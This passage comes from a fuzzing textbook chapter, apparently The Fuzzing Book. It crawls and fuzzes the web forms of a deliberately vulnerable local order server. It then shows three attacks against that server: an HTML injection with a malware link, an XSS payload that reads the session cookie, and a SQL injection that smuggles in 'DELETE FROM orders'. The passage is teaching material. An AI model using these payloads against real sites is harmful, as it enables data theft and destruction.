href="https://www.fuzzingbook.org/html/SearchBasedFuzzer.html">https://www.fuzzingbook.org/html/SearchBasedFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/MutationAnalysis.html">https://www.fuzzingbook.org/html/MutationAnalysis.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html">https://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Grammars.html">https://www.fuzzingbook.org/html/Grammars.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/GrammarFuzzer.html">https://www.fuzzingbook.org/html/GrammarFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html">https://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Parser.html">https://www.fuzzingbook.org/html/Parser.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html">https://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html">https://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html">https://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Reducer.html">https://www.fuzzingbook.org/html/Reducer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html">https://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/FuzzingWithConstraints.html">https://www.fuzzingbook.org/html/FuzzingWithConstraints.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/GrammarMiner.html">https://www.fuzzingbook.org/html/GrammarMiner.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/InformationFlow.html">https://www.fuzzingbook.org/html/InformationFlow.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/ConcolicFuzzer.html">https://www.fuzzingbook.org/html/ConcolicFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/SymbolicFuzzer.html">https://www.fuzzingbook.org/html/SymbolicFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/DynamicInvariants.html">https://www.fuzzingbook.org/html/DynamicInvariants.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html">https://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/ConfigurationFuzzer.html">https://www.fuzzingbook.org/html/ConfigurationFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/APIFuzzer.html">https://www.fuzzingbook.org/html/APIFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Carver.html">https://www.fuzzingbook.org/html/Carver.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/PythonFuzzer.html">https://www.fuzzingbook.org/html/PythonFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/WebFuzzer.html">https://www.fuzzingbook.org/html/WebFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/GUIFuzzer.html">https://www.fuzzingbook.org/html/GUIFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/06_Managing_Fuzzing.html">https://www.fuzzingbook.org/html/06_Managing_Fuzzing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/FuzzingInTheLarge.html">https://www.fuzzingbook.org/html/FuzzingInTheLarge.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/WhenToStopFuzzing.html">https://www.fuzzingbook.org/html/WhenToStopFuzzing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/99_Appendices.html">https://www.fuzzingbook.org/html/99_Appendices.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/AcademicPrototyping.html">https://www.fuzzingbook.org/html/AcademicPrototyping.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/PrototypingWithPython.html">https://www.fuzzingbook.org/html/PrototypingWithPython.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/ExpectError.html">https://www.fuzzingbook.org/html/ExpectError.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Timer.html">https://www.fuzzingbook.org/html/Timer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Timeout.html">https://www.fuzzingbook.org/html/Timeout.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/ClassDiagram.html">https://www.fuzzingbook.org/html/ClassDiagram.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/RailroadDiagrams.html">https://www.fuzzingbook.org/html/RailroadDiagrams.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/ControlFlow.html">https://www.fuzzingbook.org/html/ControlFlow.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/00_Index.html">https://www.fuzzingbook.org/html/00_Index.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/dist/fuzzingbook-code.zip">https://www.fuzzingbook.org/dist/fuzzingbook-code.zip</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip">https://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/ReleaseNotes.html">https://www.fuzzingbook.org/html/ReleaseNotes.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Importing.html">https://www.fuzzingbook.org/html/Importing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/slides/Fuzzer.slides.html">https://www.fuzzingbook.org/slides/Fuzzer.slides.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Guide_for_Authors.html">https://www.fuzzingbook.org/html/Guide_for_Authors.html</a></pre></div></div>
</div>
<p>Once we have crawled over all the links of a site, we can generate tests for all the forms we found:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">crawl</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">max_pages</span><span class="o">=</span><span class="nb">float</span><span class="p">(</span><span class="s1">&#39;inf&#39;</span><span class="p">)):</span>
    <span class="n">web_form_fuzzer</span> <span class="o">=</span> <span class="n">WebFormFuzzer</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">web_form_runner</span> <span class="o">=</span> <span class="n">WebRunner</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">web_form_fuzzer</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">web_form_runner</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>(&#39;http://127.0.0.1:8800/terms&#39;, &#39;PASS&#39;)
(&#39;http://127.0.0.1:8800/order?item=tshirt&amp;name=+&amp;email=b+%742%40+&amp;city=%45%39&amp;zip=54&amp;terms=on&amp;submit=&#39;, &#39;PASS&#39;)
(&#39;http://127.0.0.1:8800/order?item=drill&amp;name=%52-&amp;email=e%40%3f&amp;city=+&amp;zip=5&amp;terms=on&amp;submit=&#39;, &#39;PASS&#39;)
</pre></div>
</div>
</div>
</div>
<p>For even better effects, one could integrate crawling and fuzzing – and also analyze the order confirmation pages for further links.  We leave this to the reader as an exercise.</p>
<p>Let us get rid of any server messages accumulated above:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">clear_httpd_messages</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="crafting-web-attacks">
<h2>Crafting Web Attacks<a class="headerlink" href="#crafting-web-attacks" title="Link to this heading">#</a></h2>
<p>Before we close the chapter, let us take a look at a special class of “uncommon” inputs that not only yield generic failures, but actually allow <em>attackers</em> to manipulate the server at their will.  We will illustrate three common attacks using our server, which (surprise) actually turns out to be vulnerable against all of them.</p>
<section id="html-injection-attacks">
<h3>HTML Injection Attacks<a class="headerlink" href="#html-injection-attacks" title="Link to this heading">#</a></h3>
<p>The first kind of attack we look at is <em>HTML injection</em>.  The idea of HTML injection is to supply the Web server with <em>data that can also be interpreted as HTML</em>.  If this HTML data is then displayed to users in their Web browsers, it can serve malicious purposes, although (seemingly) originating from a reputable site.  If this data is also <em>stored</em>, it becomes a <em>persistent</em> attack; the attacker does not even have to lure victims towards specific pages.</p>
<p>Here is an example of a (simple) HTML injection.  For the <code class="docutils literal notranslate"><span class="pre">name</span></code> field, we not only use plain text, but also embed HTML tags – in this case, a link towards a malware-hosting site.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Grammars</span><span class="w"> </span><span class="kn">import</span> <span class="n">extend_grammar</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">ORDER_GRAMMAR_WITH_HTML_INJECTION</span><span class="p">:</span> <span class="n">Grammar</span> <span class="o">=</span> <span class="n">extend_grammar</span><span class="p">(</span><span class="n">ORDER_GRAMMAR</span><span class="p">,</span> <span class="p">{</span>
    <span class="s2">&quot;&lt;name&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">cgi_encode</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">    Jane Doe&lt;p&gt;</span>
<span class="s1">    &lt;strong&gt;&lt;a href=&quot;www.lots.of.malware&quot;&gt;Click here for cute cat pictures!&lt;/a&gt;&lt;/strong&gt;</span>
<span class="s1">    &lt;/p&gt;</span>
<span class="s1">    &#39;&#39;&#39;</span><span class="p">)],</span>
<span class="p">})</span>
</pre></div>
</div>
</div>
</div>
<p>If we use this grammar to create inputs, the resulting URL will have all of the HTML encoded in:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">html_injection_fuzzer</span> <span class="o">=</span> <span class="n">GrammarFuzzer</span><span class="p">(</span><span class="n">ORDER_GRAMMAR_WITH_HTML_INJECTION</span><span class="p">)</span>
<span class="n">order_with_injected_html</span> <span class="o">=</span> <span class="n">html_injection_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
<span class="n">order_with_injected_html</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;/order?item=drill&amp;name=%0a++++Jane+Doe%3cp%3e%0a++++%3cstrong%3e%3ca+href%3d%22www.lots.of.malware%22%3eClick+here+for+cute+cat+pictures!%3c%2fa%3e%3c%2fstrong%3e%0a++++%3c%2fp%3e%0a++++&amp;email=j_smith%40example.com&amp;city=Seattle&amp;zip=02805&#39;
</pre></div>
</div>
</div>
</div>
<p>What happens if we send this string to our Web server?  It turns out that the HTML is left in the confirmation page and shown as link.  This also happens in the log:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">order_with_injected_html</span><span class="p">)))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:16] INSERT INTO orders VALUES ('drill', '
    Jane Doe<p>
    <strong><a href="www.lots.of.malware">Click here for cute cat pictures!</a></strong>
    </p>
    ', 'j_smith@example.com', 'Seattle', '02805')
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:16] "GET /order?item=drill&name=%0A++++Jane+Doe%3Cp%3E%0A++++%3Cstrong%3E%3Ca+href%3D%22www.lots.of.malware%22%3EClick+here+for+cute+cat+pictures!%3C%2Fa%3E%3C%2Fstrong%3E%0A++++%3C%2Fp%3E%0A++++&email=j_smith%40example.com&city=Seattle&zip=02805 HTTP/1.1" 200 -
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook Rotary Hammer</strong> to 
    Jane Doe<p>
    <strong><a href="www.lots.of.malware">Click here for cute cat pictures!</a></strong>
    </p>
     in Seattle, 02805<br>
  A confirmation mail will be sent to j_smith@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<p>Since the link seemingly comes from a trusted origin, users are much more likely to follow it.  The link is even persistent, as it is stored in the database:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders WHERE name LIKE &#39;%&lt;%&#39;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[(&#39;drill&#39;, &#39;\n    Jane Doe&lt;p&gt;\n    &lt;strong&gt;&lt;a href=&quot;www.lots.of.malware&quot;&gt;Click here for cute cat pictures!&lt;/a&gt;&lt;/strong&gt;\n    &lt;/p&gt;\n    &#39;, &#39;j_smith@example.com&#39;, &#39;Seattle&#39;, &#39;02805&#39;)]
</pre></div>
</div>
</div>
</div>
<p>This means that if anyone ever queries the database (for instance, operators processing the order), they will also see the link, multiplying its impact.  By carefully crafting the injected HTML, one can thus expose malicious content to numerous users – until the injected HTML is finally deleted.</p>
</section>
<section id="cross-site-scripting-attacks">
<h3>Cross-Site Scripting Attacks<a class="headerlink" href="#cross-site-scripting-attacks" title="Link to this heading">#</a></h3>
<p>If one can inject HTML code into a Web page, one can also inject <em>JavaScript</em> code as part of the injected HTML.  This code would then be executed as soon as the injected HTML is rendered.</p>
<p>This is particularly dangerous because executed JavaScript always executes in the <em>origin</em> of the page which contains it. Therefore, an attacker can normally not force a user to run JavaScript in any origin he does not control himself. When an attacker, however, can inject his code into a vulnerable Web application, he can have the client run the code with the (trusted) Web application as origin.</p>
<p>In such a <em>cross-site scripting</em> (<em>XSS</em>) attack, the injected script can do a lot more than just plain HTML.  For instance, the code can access sensitive page content or session cookies.  If the code in question runs in the operator’s browser (for instance, because an operator is reviewing the list of orders), it could retrieve any other information shown on the screen and thus steal order details for a variety of customers.</p>
<p>Here is a very simple example of a script injection.  Whenever the name is displayed, it causes the browser to “steal” the current <em>session cookie</em> – the piece of data the browser uses to identify the user with the server.  In our case, we could steal the cookie of the Jupyter session.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">ORDER_GRAMMAR_WITH_XSS_INJECTION</span><span class="p">:</span> <span class="n">Grammar</span> <span class="o">=</span> <span class="n">extend_grammar</span><span class="p">(</span><span class="n">ORDER_GRAMMAR</span><span class="p">,</span> <span class="p">{</span>
    <span class="s2">&quot;&lt;name&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">cgi_encode</span><span class="p">(</span><span class="s1">&#39;Jane Doe&#39;</span> <span class="o">+</span>
                          <span class="s1">&#39;&lt;script&gt;&#39;</span> <span class="o">+</span>
                          <span class="s1">&#39;document.title = document.cookie.substring(0, 10);&#39;</span> <span class="o">+</span>
                          <span class="s1">&#39;&lt;/script&gt;&#39;</span><span class="p">)</span>
               <span class="p">],</span>
<span class="p">})</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">xss_injection_fuzzer</span> <span class="o">=</span> <span class="n">GrammarFuzzer</span><span class="p">(</span><span class="n">ORDER_GRAMMAR_WITH_XSS_INJECTION</span><span class="p">)</span>
<span class="n">order_with_injected_xss</span> <span class="o">=</span> <span class="n">xss_injection_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
<span class="n">order_with_injected_xss</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;/order?item=lockset&amp;name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=34506&#39;
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">url_with_injected_xss</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">order_with_injected_xss</span><span class="p">)</span>
<span class="n">url_with_injected_xss</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;http://127.0.0.1:8800/order?item=lockset&amp;name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=34506&#39;
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">webbrowser</span><span class="p">(</span><span class="n">url_with_injected_xss</span><span class="p">,</span> <span class="n">mute</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook Lock Set</strong> to Jane Doe<script>document.title = document.cookie.substring(0, 10);</script> in Seattle, 34506<br>
  A confirmation mail will be sent to j.doe@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<p>The message looks as always – but if you have a look at your browser title, it should now show the first 10 characters of your “secret” notebook cookie.  Instead of showing its prefix in the title, the script could also silently send the cookie to a remote server, allowing attackers to highjack your current notebook session and interact with the server on your behalf.  It could also go and access and send any other data that is shown in your browser or otherwise available.  It could run a <em>keylogger</em> and steal passwords and other sensitive data as it is typed in.  Again, it will do so every time the compromised order with Jane Doe’s name is shown in the browser and the associated script is executed.</p>
<p>Let us go and reset the title to a less sensitive value:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;document.title = &quot;Jupyter&quot;&lt;/script&gt;&#39;</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><script>document.title = "Jupyter"</script></div></div>
</div>
</section>
<section id="id3">
<h3>SQL Injection Attacks<a class="headerlink" href="#id3" title="Link to this heading">#</a></h3>
<p>Cross-site scripts have the same privileges as web pages – most notably, they cannot access or change data outside your browser.  So-called <em>SQL injection</em> targets <em>databases</em>, allowing to inject commands that can read or modify data in the database, or change the purpose of the original query.</p>
<p>To understand how SQL injection works, let us take a look at the code that produces the SQL command to insert a new order into the database:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">sql_command</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;INSERT INTO orders &quot;</span> <span class="o">+</span>
    <span class="s2">&quot;VALUES (&#39;</span><span class="si">{item}</span><span class="s2">&#39;, &#39;</span><span class="si">{name}</span><span class="s2">&#39;, &#39;</span><span class="si">{email}</span><span class="s2">&#39;, &#39;</span><span class="si">{city}</span><span class="s2">&#39;, &#39;</span><span class="si">{zip}</span><span class="s2">&#39;)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="n">values</span><span class="p">))</span>
</pre></div>
</div>
<p>What happens if any of the values (say, <code class="docutils literal notranslate"><span class="pre">name</span></code>) has a value that <em>can also be interpreted as a SQL command?</em>  Then, instead of the intended <code class="docutils literal notranslate"><span class="pre">INSERT</span></code> command, we would execute the command imposed by <code class="docutils literal notranslate"><span class="pre">name</span></code>.</p>
<p>Let us illustrate this by an example.  We set the individual values as they would be found during execution:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">values</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;item&quot;</span><span class="p">:</span> <span class="s2">&quot;tshirt&quot;</span><span class="p">,</span>
    <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;Jane Doe&quot;</span><span class="p">,</span>
    <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="s2">&quot;j.doe@example.com&quot;</span><span class="p">,</span>
    <span class="s2">&quot;city&quot;</span><span class="p">:</span> <span class="s2">&quot;Seattle&quot;</span><span class="p">,</span>
    <span class="s2">&quot;zip&quot;</span><span class="p">:</span> <span class="s2">&quot;98104&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
</div>
<p>and format the string as seen above:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">sql_command</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;INSERT INTO orders &quot;</span> <span class="o">+</span>
               <span class="s2">&quot;VALUES (&#39;</span><span class="si">{item}</span><span class="s2">&#39;, &#39;</span><span class="si">{name}</span><span class="s2">&#39;, &#39;</span><span class="si">{email}</span><span class="s2">&#39;, &#39;</span><span class="si">{city}</span><span class="s2">&#39;, &#39;</span><span class="si">{zip}</span><span class="s2">&#39;)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="n">values</span><span class="p">))</span>
<span class="n">sql_command</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&quot;INSERT INTO orders VALUES (&#39;tshirt&#39;, &#39;Jane Doe&#39;, &#39;j.doe@example.com&#39;, &#39;Seattle&#39;, &#39;98104&#39;)&quot;
</pre></div>
</div>
</div>
</div>
<p>All fine, right?  But now, we define a very “special” name that can also be interpreted as a SQL command:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">values</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;Jane&#39;, &#39;x&#39;, &#39;x&#39;, &#39;x&#39;); DELETE FROM orders; -- &quot;</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">sql_command</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;INSERT INTO orders &quot;</span> <span class="o">+</span>
               <span class="s2">&quot;VALUES (&#39;</span><span class="si">{item}</span><span class="s2">&#39;, &#39;</span><span class="si">{name}</span><span class="s2">&#39;, &#39;</span><span class="si">{email}</span><span class="s2">&#39;, &#39;</span><span class="si">{city}</span><span class="s2">&#39;, &#39;</span><span class="si">{zip}</span><span class="s2">&#39;)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="n">values</span><span class="p">))</span>
<span class="n">sql_command</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&quot;INSERT INTO orders VALUES (&#39;tshirt&#39;, &#39;Jane&#39;, &#39;x&#39;, &#39;x&#39;, &#39;x&#39;); DELETE FROM orders; -- &#39;, &#39;j.doe@example.com&#39;, &#39;Seattle&#39;, &#39;98104&#39;)&quot;
</pre></div>
</div>
</div>
</div>
<p>What happens here is that we now get a command to insert values into the database (with a few “dummy” values <code class="docutils literal notranslate"><span class="pre">x</span></code>), followed by a SQL <code class="docutils literal notranslate"><span class="pre">DELETE</span></code> command that would <em>delete all entries</em> of the orders table.  The string <code class="docutils literal notranslate"><span class="pre">--</span> </code> starts a SQL <em>comment</em> such that the remainder of the original query would be easily ignored.  By crafting strings that can also be interpreted as SQL commands, attackers can alter or delete database data, bypass authentication mechanisms and many more.</p>
<p>Is our server also vulnerable to such attacks?  Of course, it is.  We create a special grammar such that we can set the <code class="docutils literal notranslate"><span class="pre">&lt;name&gt;</span></code> parameter to a string with SQL injection, just as shown above.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Grammars</span><span class="w"> </span><span class="kn">import</span> <span class="n">extend_grammar</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">ORDER_GRAMMAR_WITH_SQL_INJECTION</span> <span class="o">=</span> <span class="n">extend_grammar</span><span class="p">(</span><span class="n">ORDER_GRAMMAR</span><span class="p">,</span> <span class="p">{</span>
    <span class="s2">&quot;&lt;name&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;Jane&#39;, &#39;x&#39;, &#39;x&#39;, &#39;x&#39;); DELETE FROM orders; --&quot;</span><span class="p">)],</span>
<span class="p">})</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">sql_injection_fuzzer</span> <span class="o">=</span> <span class="n">GrammarFuzzer</span><span class="p">(</span><span class="n">ORDER_GRAMMAR_WITH_SQL_INJECTION</span><span class="p">)</span>
<span class="n">order_with_injected_sql</span> <span class="o">=</span> <span class="n">sql_injection_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
<span class="n">order_with_injected_sql</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&quot;/order?item=drill&amp;name=Jane&#39;,+&#39;x&#39;,+&#39;x&#39;,+&#39;x&#39;)%3b+DELETE+FROM+orders%3b+--&amp;email=j.doe%40example.com&amp;city=New+York&amp;zip=14083&quot;
</pre></div>
</div>
</div>
</div>
<p>These are the current orders:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
